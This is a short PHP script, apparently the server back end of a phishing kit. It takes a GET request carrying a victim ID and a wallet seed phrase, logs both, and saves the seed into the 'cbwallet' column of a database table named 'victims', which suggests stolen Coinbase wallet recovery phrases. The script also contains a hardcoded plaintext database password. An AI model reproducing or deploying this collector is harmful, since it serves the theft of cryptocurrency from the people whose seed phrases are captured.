<?php
// update_cbwallet.php

// Replace with your database credentials
define('MYSQL_USER', 'phpmyadmin'); // Database user (cPanel is {user}_{db})
define('MYSQL_PASS', 'haha123'); // Your MySQL database password
define('MYSQL_HOST', 'localhost');
define('MYSQL_DATABASE', 'support');

try {
    // Create connection
    $pdo = new PDO('mysql:host=' . MYSQL_HOST . ';dbname=' . MYSQL_DATABASE, MYSQL_USER, MYSQL_PASS );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // Set PDO to throw exceptions on errors
} catch (PDOException $e) {
    // Handle connection errors
    die(json_encode(['status' => 'error', 'message' => 'Connection failed: ' . $e->getMessage()]));
}

// Retrieve GET data (validate existence)
$id = isset($_GET['id']) ? $_GET['id'] : null;
$seed = isset($_GET['seed']) ? $_GET['seed'] : null;

// Log the received data to the error log
error_log("ID: " . print_r($id, true));
error_log("Seed: " . print_r($seed, true));

if (!$id || !$seed) {
    die(json_encode(['status' => 'error', 'message' => 'Missing id or seed', 'id' => $id, 'seed' => $seed]));
}

if (!is_numeric($id)) {
    die(json_encode(['status' => 'error', 'message' => 'ID is not numeric', 'id' => $id, 'seed' => $seed]));
}

$id = (int) $id;

try {
    // Prepare SQL statement
    $stmt = $pdo->prepare("UPDATE victims SET cbwallet = :seed WHERE id = :id");

    // Bind parameters
    $stmt->bindParam(':seed', $seed);
    $stmt->bindParam(':id', $id);

    // Execute SQL statement
    if ($stmt->execute()) {
        echo json_encode(['status' => 'success', 'id' => $id, 'seed' => $seed]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to execute SQL', 'id' => $id, 'seed' => $seed]);
    }
} catch (PDOException $e) {
    // Handle PDO exceptions (SQL errors)
    echo json_encode(['status' => 'error', 'message' => 'PDO Exception: ' . $e->getMessage(), 'id' => $id, 'seed' => $seed]);
}
?>
